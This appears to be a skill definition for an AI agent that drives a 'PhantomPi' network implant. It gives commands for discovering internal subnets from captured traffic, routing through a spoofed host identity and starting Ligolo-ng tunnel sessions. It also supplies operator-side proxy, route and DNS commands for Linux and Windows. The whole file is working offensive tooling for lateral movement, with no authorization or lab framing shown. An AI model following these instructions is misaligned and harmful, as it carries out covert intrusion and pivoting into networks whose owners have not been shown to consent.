---
name: pivot
description: >
  Manage network pivoting through a PhantomPi implant: check pivot readiness,
  discover reachable internal subnets from captured traffic, set up routes
  through the spoofed identity on veth1, and manage Ligolo-ng agent sessions.
  Triggers on: pivot, ligolo, route, tunnel, reach, subnet, internal, lateral,
  movement, session, agent, proxy.
metadata: {"openclaw":{"requires":{"bins":["curl","nc"]},"os":["linux"]}}
---

# Pivot

## Command 0: "Any new routes?" / "What subnets can I add?"

Just fetch pivot-status and show **every entry** in `suggested_subnets`, ranked by packet count. Report all of them; do not filter or drop entries with low packet counts. Skip identity context, do not prompt for setup.

```bash
bash /home/openclaw/scripts/query-implant.sh /pivot-status [IMPLANT_IP]
```

If list is empty, say no RFC1918 destinations were found in recent captures.

## Command 1: "Pivot to X" / "What can I reach?"

### Step 1: fetch pivot status

```bash
bash /home/openclaw/scripts/query-implant.sh /pivot-status [IMPLANT_IP]
```

If `pivot_ready` is `false`: tell operator to run `spoof-target.sh` via SSH first. Do not proceed.

If `pivot_ready` is `true`: show spoofed identity (`ip`, `hostname`, `gateway`, `dns`), `current_routes`, and `suggested_subnets` as a ranked list with packet counts and protocol hints.

### Step 2: set up routes (after operator confirms)

```bash
bash /home/openclaw/scripts/query-implant.sh --post /pivot-setup \
  '{"subnets":["192.168.10.0/24","10.10.5.0/24"]}' [IMPLANT_IP]
```

Report `configured`, `skipped`, `failed`. Flag failures.

### Reset routes

```bash
# Specific subnets:
bash /home/openclaw/scripts/query-implant.sh --post /pivot-reset \
  '{"subnets":["192.168.10.0/24"]}' [IMPLANT_IP]

# All routes on veth1:
bash /home/openclaw/scripts/query-implant.sh --post /pivot-reset '{}' [IMPLANT_IP]
```

## Command 2: Ligolo session management

### List / start / kill sessions

```bash
# List:
bash /home/openclaw/scripts/query-implant.sh /ligolo-sessions [IMPLANT_IP]

# Start:
bash /home/openclaw/scripts/query-implant.sh --post /ligolo-start \
  '{"proxy_ip":"10.8.0.2","proxy_port":11601}' [IMPLANT_IP]

# Kill one / all:
bash /home/openclaw/scripts/query-implant.sh --post /ligolo-kill \
  '{"session":"ligolo-10.8.0.2"}' [IMPLANT_IP]
bash /home/openclaw/scripts/query-implant.sh --post /ligolo-kill \
  '{"session":"all"}' [IMPLANT_IP]
```

After a successful start, output the exact operator-side commands. Infer OS from context; if unknown, output both blocks.

**Linux:**
```bash
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# in proxy shell: session -> start
sudo ip route add <subnet> dev ligolo0   # one line per subnet
echo "nameserver <dns>" | sudo tee /etc/resolv.conf
```

**Windows (Administrator):**
```powershell
.\ligolo-proxy.exe -selfcert -laddr 0.0.0.0:11601
# in proxy shell: session -> start
route add <subnet> mask 255.255.255.0 0.0.0.1 if <IDX>   # one line per subnet
netsh interface ip set dns "ligolo0" static <dns>
```

Fill in real subnet and DNS values. Never use placeholders in the final output.

## Targeting implants

- Omit IP for read queries; script reads `$IMPLANT_IPS` automatically.
- Always pass a specific IP for POST operations; writes are never broadcast.
- If multiple implants and operator did not specify, ask before any write.

## Reporting guidelines

1. Show spoofed identity before discussing routes.
2. Do not set up routes without explicit operator confirmation.
3. For Ligolo: show session name, proxy IP, running state.
4. After any action affecting the operator's machine, output the full copy-paste command block with real values.
